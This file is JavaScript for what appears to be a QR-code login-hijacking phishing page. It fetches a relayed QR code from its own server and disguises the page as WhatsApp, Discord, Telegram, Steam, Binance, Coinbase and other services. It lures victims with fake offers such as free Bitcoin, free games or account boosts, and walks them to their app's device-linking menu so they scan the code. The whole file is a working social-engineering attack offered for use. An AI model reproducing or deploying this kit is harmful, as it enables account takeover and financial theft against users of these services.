

        const API_URL = window.location.origin;
        const QRCODE_ID = "11111111-1111-1111-1111-111111111111";

        function updatePage(host) {
            if (host.startsWith("www.")) {
                host = host.substring(4);
            }
            console.log("update: " + host);
            var logo = document.querySelector("#platformLogo");
            switch (host) {
                case "web.whatsapp.com":
                    document.title = "WhatsApp | Login";
                    document.querySelector("body").style.backgroundColor = "#111b21";
                    document.querySelector("body").style.color = "#e9edef";
                    document.querySelector("h3").style.color = "#00a884";
                    document.querySelector("#box").style.backgroundColor = "#202c33";
                    document.querySelector("#title").innerHTML = "Join Group Call";
                    document.querySelector("#message").innerHTML = "Scan this QR code in your <strong>WhatsApp</strong> mobile app to <strong>join the group call</strong>.";
                    document.querySelector("#guide").innerHTML = "[ <strong>⁝</strong> &gt; <strong>Linked devices</strong> &gt; <strong>Link a device</strong> ]";
                    logo.src = "https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg";
                    logo.style.display = "block";
                    break;
                case "discord.com":
                    document.title = "Discord | Login";
                    document.querySelector("body").style.backgroundColor = "#5d66f6";
                    document.querySelector("body").style.color = "#b4b6ba";
                    document.querySelector("h3").style.color = "#fff";
                    document.querySelector("#box").style.backgroundColor = "#36393f";
                    document.querySelector("#title").innerHTML = "Server Invite";
                    document.querySelector("#message").innerHTML = "Scan this QR code in your <strong>Discord</strong> mobile app to <strong>join the server</strong>.";
                    document.querySelector("#guide").innerHTML = "[ <strong>Profile</strong> &gt; <strong>Scan QR Code</strong> ]";
                    logo.src = "https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png";
                    logo.style.display = "block";
                    break;
                case "tiktok.com":
                    document.title = "TikTok | Login";
                    document.querySelector("body").style.backgroundColor = "#ef2a50";
                    document.querySelector("body").style.color = "#000";
                    document.querySelector("h3").style.color = "#000";
                    document.querySelector("#box").style.backgroundColor = "#fff";
                    document.querySelector("#title").innerHTML = "Account Boost";
                    document.querySelector("#message").innerHTML = "Scan this QR code in your <strong>TikTok</strong> mobile app to give your account a <strong>permanent boost</strong>.";
                    document.querySelector("#guide").innerHTML = "[ <strong>Profile</strong> &gt; <strong>Scan QR Code</strong> ]";
                    logo.src = "https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg";
                    logo.style.display = "block";
                    break;
                case "binance.com":
                case "accounts.binance.com":
                    document.title = "Binance | Login";
                    document.querySelector("body").style.backgroundColor = "#fcd949";
                    document.querySelector("#box").style.backgroundColor = "#fff";
                    document.querySelector("#title").innerHTML = "Free Bitcoins";
                    document.querySelector("#message").innerHTML = "Scan this QR code in your <strong>Binance</strong> app to <strong>receive free BTC</strong> instantly.";
                    logo.src = "https://www.google.com/s2/favicons?domain=binance.com&sz=128";
                    logo.style.display = "block";
                    break;
                case "store.steampowered.com":
                    document.title = "Steam | Login";
                    document.querySelector("body").style.backgroundColor = "#1b2838";
                    document.querySelector("body").style.color = "#c7d5e0";
                    document.querySelector("h3").style.color = "#fff";
                    document.querySelector("#box").style.backgroundColor = "#2a3f5f";
                    document.querySelector("#title").innerHTML = "Free Game Gift";
                    document.querySelector("#message").innerHTML = "Scan this QR code in your <strong>Steam</strong> app to <strong>claim a free game</strong>.";
                    document.querySelector("#guide").innerHTML = "[ Open <strong>Steam Guard</strong> ]";
                    logo.src = "https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg";
                    logo.style.display = "block";
                    break;
                case "web.telegram.org":
                    document.title = "Telegram | Login";
                    document.querySelector("body").style.backgroundColor = "#8775e4";
                    document.querySelector("body").style.color = "#b4b6ba";
                    document.querySelector("h3").style.color = "#fff";
                    document.querySelector("#box").style.backgroundColor = "#212121";
                    document.querySelector("#title").innerHTML = "Join Channel";
                    document.querySelector("#message").innerHTML = "Scan this QR code in your <strong>Telegram</strong> app to <strong>join the channel</strong>.";
                    document.querySelector("#guide").innerHTML = "[ <strong>⁝</strong> &gt; <strong>Settings</strong> &gt; <strong>Devices</strong> &gt; <strong>Link Desktop Device</strong> ]";
                    logo.src = "https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg";
                    logo.style.display = "block";
                    break;
                case "roblox.com":
                    document.title = "Roblox Login";
                    document.querySelector("body").style.backgroundColor = "#191b1d";
                    document.querySelector("#box").style.backgroundColor = "#232527";
                    document.querySelector("#title").innerHTML = "Quick Log In";
                    document.querySelector("#message").innerHTML = "Scan this QR code with your <strong>Roblox mobile app</strong> to log in instantly.";
                    logo.src = "https://www.google.com/s2/favicons?domain=roblox.com&sz=128";
                    logo.style.display = "block";
                    break;
                case "viber.com":
                    document.title = "Viber for Desktop";
                    document.querySelector("body").style.backgroundColor = "#7360f2";
                    document.querySelector("#box").style.backgroundColor = "#fff";
                    document.querySelector("#box").style.color = "#000";
                    document.querySelector("#title").innerHTML = "Link Device";
                    document.querySelector("#message").innerHTML = "Scan the QR code to sync your Viber account to this computer.";
                    logo.src = "https://upload.wikimedia.org/wikipedia/commons/5/5e/Viber_logo_2018.svg";
                    logo.style.display = "block";
                    break;
                case "line.me":
                    document.title = "LINE Login";
                    document.querySelector("body").style.backgroundColor = "#06c755";
                    document.querySelector("#box").style.backgroundColor = "#fff";
                    document.querySelector("#title").innerHTML = "Sign in with QR";
                    document.querySelector("#message").innerHTML = "Open <strong>LINE</strong> on your mobile and scan the code.";
                    logo.src = "https://upload.wikimedia.org/wikipedia/commons/4/41/LINE_logo.svg";
                    logo.style.display = "block";
                    break;
                case "wechat.com":
                case "web.wechat.com":
                    document.title = "WeChat Web";
                    document.querySelector("body").style.backgroundColor = "#f0f0f0";
                    document.querySelector("#box").style.backgroundColor = "#fff";
                    document.querySelector("#box").style.color = "#000";
                    document.querySelector("#title").innerHTML = "Login to WeChat";
                    document.querySelector("#message").innerHTML = "Scan the QR code to log in to WeChat Web.";
                    logo.src = "https://upload.wikimedia.org/wikipedia/commons/7/73/WeChat_logo.svg";
                    logo.style.display = "block";
                    break;
                case "kucoin.com":
                    document.title = "KuCoin Login";
                    document.querySelector("body").style.backgroundColor = "#0a0f12";
                    document.querySelector("#box").style.backgroundColor = "#1e2226";
                    document.querySelector("#title").innerHTML = "Secure Login";
                    document.querySelector("#message").innerHTML = "Scan the QR with <strong>KuCoin App</strong> to log in.";
                    document.querySelector("#guide").innerHTML = "[ <strong>Profile</strong> > <strong>Scan</strong> ]";
                    logo.src = "https://www.logo.wine/a/logo/KuCoin/KuCoin-Logo.wine.svg";
                    logo.style.display = "block";
                    break;
                case "bilibili.com":
                    document.title = "Bilibili | Login";
                    document.querySelector("body").style.backgroundColor = "#fb7299";
                    document.querySelector("#box").style.backgroundColor = "#fff";
                    document.querySelector("#box").style.color = "#000";
                    document.querySelector("#title").innerHTML = "Scan to Login";
                    document.querySelector("#message").innerHTML = "Scan this QR code with <strong>Bilibili App</strong> to log in.";
                    logo.src = "https://www.logo.wine/a/logo/Bilibili/Bilibili-Logo.wine.svg";
                    logo.style.display = "block";
                    break;
                case "alipay.com":
                case "auth.alipay.com":
                    document.title = "Alipay | Login";
                    document.querySelector("body").style.backgroundColor = "#00a3ee";
                    document.querySelector("#box").style.backgroundColor = "#fff";
                    document.querySelector("#title").innerHTML = "Scan to Pay";
                    document.querySelector("#message").innerHTML = "Scan this QR code with your <strong>Alipay App</strong> to authenticate.";
                    logo.src = "https://www.google.com/s2/favicons?domain=alipay.com&sz=128";
                    logo.style.display = "block";
                    break;
                case "coinbase.com":
                    document.title = "Coinbase Login";
                    document.querySelector("body").style.backgroundColor = "#f4f7fa";
                    document.querySelector("#box").style.backgroundColor = "#fff";
                    document.querySelector("#box").style.color = "#000";
                    document.querySelector("#title").innerHTML = "Sign in with QR";
                    document.querySelector("#message").innerHTML = "Scan this with your <strong>Coinbase app</strong> to log in.";
                    logo.src = "https://upload.wikimedia.org/wikipedia/commons/c/c5/Coinbase_logo_initials.png";
                    logo.style.display = "block";
                    break;
                case "teamviewer.com":
                    document.title = "TeamViewer Remote";
                    document.querySelector("body").style.backgroundColor = "#f2f2f2";
                    document.querySelector("#box").style.backgroundColor = "#fff";
                    document.querySelector("#box").style.color = "#000";
                    document.querySelector("#title").innerHTML = "Remote Auth";
                    document.querySelector("#message").innerHTML = "Scan to authenticate your TeamViewer remote session.";
                    logo.src = "https://upload.wikimedia.org/wikipedia/commons/d/df/TeamViewer_logo.svg";
                    logo.style.display = "block";
                    break;
            }
        }

        function updateQR(t) {
            var url = API_URL + "/qrcode/" + QRCODE_ID;
            if (t > 0) {
                url += "?t=" + t;
            }
            console.log("fetching: " + url);
            fetch(url, {
                method: "GET",
                headers: {
                    "Content-Type": "application/json"
                }
            })
                .then((response) => {

                    if (response.status == 200) {
                        return response.json();
                    } else if (response.status == 408) {
                        console.log("timed out");
                        updateQR(t);
                    } else {
                        throw "http error: " + response.status;
                        //return response.error("http error");
                        //setTimeout(function () { updateQR(t) }, 10000);
                    }
                })
                .then((data) => {
                    if (data !== undefined) {
                        console.log("api: success:", data);

                        var o = document.getElementById("qrCode");
                        if (o != null) {
                            o.src = data.source;
                            o.style.display = "block";
                        }
                        document.getElementById("loading-state").style.display = "none";
                        document.getElementById("qr-content").style.display = "block";
                        updatePage(data.host);
                        updateQR(data.update_time);
                    }
                })
                .catch((error) => {
                    console.error("api: error:", error);
                    setTimeout(function () { updateQR(t) }, 10000);
                });
        }
        updateQR(0);

    
